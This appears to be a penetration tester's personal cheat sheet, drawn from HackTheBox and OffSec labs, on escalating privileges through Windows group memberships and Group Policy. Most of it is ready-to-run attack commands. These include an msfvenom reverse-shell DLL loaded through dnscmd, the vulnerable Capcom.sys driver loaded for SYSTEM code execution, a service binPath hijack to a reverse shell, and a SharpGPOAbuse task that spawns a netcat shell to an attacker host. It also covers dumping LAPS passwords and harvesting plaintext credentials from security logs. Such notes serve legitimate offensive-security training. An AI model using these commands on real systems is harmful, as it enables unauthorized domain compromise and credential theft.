```cmd
whoami /groups
```
---
## Backup Operators group
Membership of this group grants its members the SeBackup and SeRestore privileges. The `SeBackupPrivilege` allows us to traverse any folder and list the folder contents.
```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
SeBackupPrivilege is enabled

PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
PS C:\htb>  cat .\Contract.txt
```

OR
#backupoperators

---
## Event Log Readers group
Members of this group can read **Security Logs**!
```powershell
# Searching security logs
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword

# Passing credentials to run as another user
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
OR
```powershell
# Get-WinEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

---
## DnsAdmins
https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.139.254 LPORT=4444 -f dll -o lol.dll
```
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
sc stop dns
sc start dns
```

---
## Hyper-V Administrators
https://academy.hackthebox.com/module/67/section/604

---
## Print Operators
%% Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER". %%

Print Operators is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to *manage, create, share, and delete printers* connected to a Domain Controller, as well as the ability to *log on locally to a Domain Controller and shut it down*.
It's well known that the driver `Capcom.sys` contains functionality to allow any user to *execute shellcode with SYSTEM privileges*. We can use our privileges to load this vulnerable driver and escalate privileges.

 This exploit requires a privileged shell  
```powershell
# Verification
whoami /priv

Privilege Name                Description                          State
============================= ==================================  ==========
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
```

### Automated Exploit
https://github.com/TarlogicSecurity/EoPLoadDriver/

```cmd
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0

C:\htb> ExploitCapcom.exe
```


### Manual Exploit
https://academy.hackthebox.com/module/67/section/605

---
## Server Operators
The **Server Operators** group allows members to administer Windows servers without needing assignment of Domain Admin privileges.

https://academy.hackthebox.com/module/67/section/606
```cmd
sc config AppReadiness binPath= "cmd /c C:\Tools\rev_shell.exe"
sc start AppReadiness
```

---
## LAPS Readers
A user in LAPS Readers group can read local admin passwords
```powershell
# Confirm if LAPS is enabled
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

# Check if that folder exists and contains AdmPwd.dll
dir "C:\Program Files\LAPS\CSE"
```

**Credential Dumping**
```sh
# From Kali Linux
pyLAPS --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip 192.168.56.101
lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec
```

From Windows:
https://www.thehacker.recipes/a-d/movement/dacl/readlapspassword
https://www.hackingarticles.in/credential-dumpinglaps/

---
# GPO (Group Policy Objects)
![[Pasted image 20240602123300.png]]

```powershell
. .\powerview.ps1
Get-NetGPO
```
![[Pasted image 20240602123431.png]]
```powershell
## Method 1
# Execute Sharp.GPOAbuse.exe, below command execute in powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "Administrator" --Command "cmd.exe" --Arguments "/c c:\temp\nc.exe $KaliIP 80 -e cmd.exe" --GPOName "Default Domain Policy"

# At kali machine
rlwrap nc -nlvp 80

# At target machine, update the GPO changes
gpupdate /force
```

## Method 2 (If you have the permissions to change password)
https://youtu.be/pmaeQlFkFV0?feature=shared&t=1164

```powershell
./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
gpupdate /force # On the target machine if you got normal access already
net localgroup administrators
```